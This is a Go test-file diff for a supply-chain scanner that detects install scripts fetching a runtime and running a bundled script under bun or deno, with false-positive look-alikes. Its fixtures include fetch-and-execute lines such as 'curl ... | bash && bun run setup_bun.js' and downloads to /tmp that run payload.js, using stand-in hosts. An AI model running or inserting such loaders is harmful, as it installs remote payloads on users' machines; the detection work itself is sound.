@@ -376,3 +376,53 @@ func TestLooksXorLoader_WebpackBundleNotFlagged(t *testing.T) {
 		t.Fatal("HMAC pad + literal Function shim matched the XOR-loader rule")
 	}
 }
+
+// Since v0.22.106 (F11): fetch, then run a bundled script under bun/deno. The
+// shapes are the keyv@6.0.0 / @bitwarden/cli 2026.4.0 / intercom-client@7.0.4
+// loaders, including the one that hides the script name behind a decoder.
+func TestScanReferencedBody_ForeignRuntimeLoaderFires(t *testing.T) {
+	for name, body := range map[string]string{
+		"execFile dir+/bun, __dirname arg": "https.get(u,r=>{r.pipe(w).on('finish',()=>{execFileSync(dir+'/bun',[path.join(__dirname,D(0))]);});});",
+		"bun from PATH, literal script":    `https.get(u,cb);execFileSync("bun",[path.join(__dirname,"bw1.js")],{stdio:"inherit"})`,
+		"path.join runtime":                "await fetch(u);spawnSync(path.join(dir,'bun'),['Math_Symbol.js']);",
+		"template runtime, import.meta":    "execSync(`curl -fsSL ${url} -o /tmp/.b.zip`);execFileSync(`/tmp/.b/bun-${plat}-${arch}/bun`, [path.join(here, 'router_runtime.js')]);",
+		"shell command line":               "#!/bin/bash\ncurl -fsSL https://dl.example.invalid/bun.zip -o /tmp/b.zip && unzip -oq /tmp/b.zip -d /tmp/b && /tmp/b/bun \"$(dirname \"$0\")/router_runtime.js\"\n",
+		"bun run string":                   "require('child_process').execSync('curl -fsSL https://bun.example.invalid/install | bash && bun run setup_bun.js')",
+		"deno with flags":                  "wget -q https://dl.example.invalid/deno.zip && ./deno run -A loader.ts",
+		"shell line":                       "#!/usr/bin/env bash\ncurl -fsSL https://dl.example.invalid/b.zip -o b.zip\n/tmp/b/bun ./payload.js\n",
+	} {
+		if got := ScanReferencedBody(body); got != KindFetchesRemote {
+			t.Errorf("%s: got %q, want fetches_remote", name, got)
+		}
+	}
+}
+
+// The look-alikes: a binary installer that checks the version of what it
+// fetched, a bundler (the word "bun" inside an identifier), node running its
+// own script, and a bun invocation with no fetch in the body.
+func TestScanReferencedBody_ForeignRuntimeLookAlikesStayPresent(t *testing.T) {
+	for name, body := range map[string]string{
+		"bun version check":     `https.get(u,cb);const out=execFileSync(binPath,["--version"]);execFileSync("./bun",["--revision"]);`,
+		"bundler identifier":    "https.get(u,cb);spawnSync(bundlerBin,[path.join(__dirname,'cfg.js')]);",
+		"node runs own script":  "https.get(u,cb);spawnSync(process.execPath,[path.join(__dirname,'install.js')]);",
+		"no fetch":              `execFileSync("bun",[path.join(__dirname,"build.js")]);`,
+		"bun in prose":          "// works on node and bun; see install.js\nhttps.get(u,cb);",
+		"esbuild validate":      "https.get(u,cb);child_process.execFileSync(command.shift(), command, {stdio:'pipe'});",
+		"bun install subcomand": "https.get(u,cb);execSync('bun install --frozen-lockfile');",
+		// Review LOW 7: free text, not an exec context.
+		"message":       "https.get(u,cb);console.log('If you use Bun, run: bun run setup.ts');",
+		"comment":       "// works with bun scripts/postinstall.js\nhttps.get(u,cb);",
+		"shell comment": "#!/bin/sh\ncurl -fsSL https://x.example.invalid/a -o a\n# then: bun run setup.ts\n",
+	} {
+		if got := ScanReferencedBody(body); got == KindFetchesRemote {
+			t.Errorf("%s: escalated to fetches_remote", name)
+		}
+	}
+}
+
+func TestNextHopScripts_DirJoinLiteral(t *testing.T) {
+	got := NextHopScripts(`execFileSync('bun',[__dirname+'/Math_Symbol.js']);exec('bash '.escapeshellarg(dirname(__DIR__).'/setup-intercom.sh'));`)
+	if strings.Join(got, ",") != "Math_Symbol.js,setup-intercom.sh" {
+		t.Fatalf("NextHopScripts = %v", got)
+	}
+}
